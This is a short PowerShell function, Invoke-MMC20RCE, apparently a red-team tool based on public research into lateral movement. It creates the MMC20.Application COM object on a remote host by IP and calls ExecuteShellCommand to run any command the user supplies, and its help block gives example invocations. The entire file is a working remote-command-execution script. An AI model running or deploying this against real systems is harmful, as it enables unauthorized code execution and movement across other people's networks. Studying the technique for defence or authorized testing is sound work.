function Invoke-MMC20RCE {
<#
.SYNOPSIS
    Research on Lateral movement using MMC20.Application COM Object by Matt "enigma0x3" Nelson
    A simple implementation by Tanoy "n0tty" Bose
.Description
    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
.Parameter IP
    Specify the target IP address.
.Parameter CMD
    Specify the command that needs to be executed.
.Parameter PARAMS
    Additional parameters that 
.Example
    Invoke-MMC20RCE -ip 127.0.0.1 -cmd cmd.exe -params "if any parameters required"
    Invoke-MMC20RCE -ip 127.0.0.1 -cmd "C:\Windows\System32\cmd.exe" -params "if any parameters required"
#>

    param(
        [Parameter(Mandatory=$true)]
        [String]
        $IP,
        [Parameter(Mandatory=$true)]
        [String]
        $cmd,
        [Parameter(Mandatory=$false)]
        [String]
        $params
    )

    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",$IP))
    $com.Document.ActiveView.ExecuteShellCommand($cmd,$null,$params,"7")
}

